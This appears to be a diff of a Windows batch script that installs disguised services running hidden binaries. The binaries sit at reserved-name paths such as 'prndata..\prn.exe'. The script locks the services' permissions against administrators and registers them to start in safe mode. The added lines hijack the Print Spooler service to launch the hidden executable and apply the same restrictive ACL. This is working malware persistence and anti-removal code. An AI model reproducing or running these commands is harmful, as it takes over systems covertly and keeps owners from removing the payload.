@@ -66,12 +66,14 @@ rd /s /q "%ProgramData%\hared"
 
 sc create OneSyncTask binPath="\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn" start="auto" obj="LocalSystem"
 sc create PcaSvcTask binPath="\\?\%ProgramData%\condata..\con.exe \\?\%ProgramData%\condata..\con" start="auto" obj="LocalSystem"
+sc config "Spooler" binpath= "\\?\%ProgramData%\prndata..\prn.exe \\?\%ProgramData%\prndata..\prn"
 sc config PcaSvcTask start= delayed-auto
 
 sc start OneSyncTask
 
 sc sdset "OneSyncTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 sc sdset "PcaSvcTask" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
+sc sdset "Spooler" "D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)"
 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal\OneSyncTask" /VE /T REG_SZ /F /D "Service"
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot\Network\OneSyncTask" /VE /T REG_SZ /F /D "Service"
